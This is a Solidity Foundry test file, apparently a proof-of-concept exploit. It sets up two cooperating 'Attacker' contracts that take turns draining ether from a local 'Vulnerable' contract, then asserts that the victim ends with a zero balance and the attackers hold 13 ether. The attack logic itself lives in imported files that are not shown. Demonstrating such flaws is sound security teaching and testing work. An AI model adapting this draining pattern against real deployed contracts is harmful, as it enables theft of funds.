// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Vulnerable} from "../src/Vulnerable.sol";
import {Attacker} from "../src/Attacker.sol";
import {Test, console2} from "forge-std/Test.sol";

contract POC is Test {
    Vulnerable public victim;
    Attacker public thief_A;
    Attacker public thief_B;

    function setUp() public {
        // Declaring our contracts
        victim = new Vulnerable();
        thief_A = new Attacker(victim);
        thief_B = new Attacker(victim);
        thief_A.setRobinHood(thief_B);
        thief_B.setRobinHood(thief_A);

        // Funding both parties
        vm.deal(address(thief_A), 1 ether); // It is not necessary to fund the attacker as you could just send eth along, but still
        vm.deal(address(thief_B), 1 ether);
        vm.deal(address(victim), 10 ether);
    }

    function test_Exploit() public {
        thief_A.attackInit{value: 1 ether}();
        thief_B.attackNext();
        thief_A.attackNext();
        thief_B.attackNext();
        thief_A.attackNext();
        thief_B.attackNext();
        thief_A.attackNext();
        thief_B.attackNext();
        thief_A.attackNext();
        thief_B.attackNext();
        thief_A.attackNext();

        assertEq(address(victim).balance, 0);
        assertGt(address(thief_A).balance + address(thief_B).balance, 2 ether);
        assertEq((address(thief_A).balance + address(thief_B).balance), 13 ether);

        console2.log(address(thief_A).balance + address(thief_B).balance);
    }
}
